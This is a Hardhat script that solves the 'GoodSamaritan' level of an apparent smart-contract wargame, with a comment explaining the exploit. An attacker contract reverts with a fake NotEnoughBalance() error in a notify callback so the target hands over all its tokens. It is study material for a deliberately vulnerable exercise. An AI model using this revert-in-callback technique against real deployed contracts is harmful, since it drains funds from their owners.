import { ethers } from "hardhat";
import { Contract, Signer } from "ethers";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { abi as CoinAbi } from "../../artifacts/contracts/27.GoodSamaritan/GoodSamaritan.sol/Coin.json";
import { abi } from "../../artifacts/contracts/27.GoodSamaritan/GoodSamaritan.sol/GoodSamaritan.json";
import { deployContract } from "../../utils/deployContract";
import { displayResult } from "../../utils/displayResult";

const targetAddress = "0xd47f6c5e8719bd9378830046c2f0aab1c8b140f3";

async function main() {
  const [attacker]: SignerWithAddress[] = await ethers.getSigners();
  const goodSamaritanAttacker = await deployContract(
    "GoodSamaritanAttacker",
    attacker,
    [targetAddress]
  );

  const target = new Contract(targetAddress, abi, attacker);
  const coin = new Contract(await target.coin(), CoinAbi, attacker);
  const wallet = new Contract(await target.wallet(), CoinAbi, attacker);
  const tx = await goodSamaritanAttacker.attack();
  await tx.wait();

  const balance = await coin.balances(wallet.address);
  displayResult(balance.isZero());
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

/* Explanation:
  The good samaritan contract in its requestDonation function states that if 
  wallet.donate10() reverts the NotEnoughBalance() error the msg.sender will receive
  all the remaining founds...
  This is something we can do thanks to the notify function that the Coin contract
  will call on our contract. So on first call of notify we will revert, making 
  the samaritan sending all its tokens and we will make sure to not revert the second time.
 */
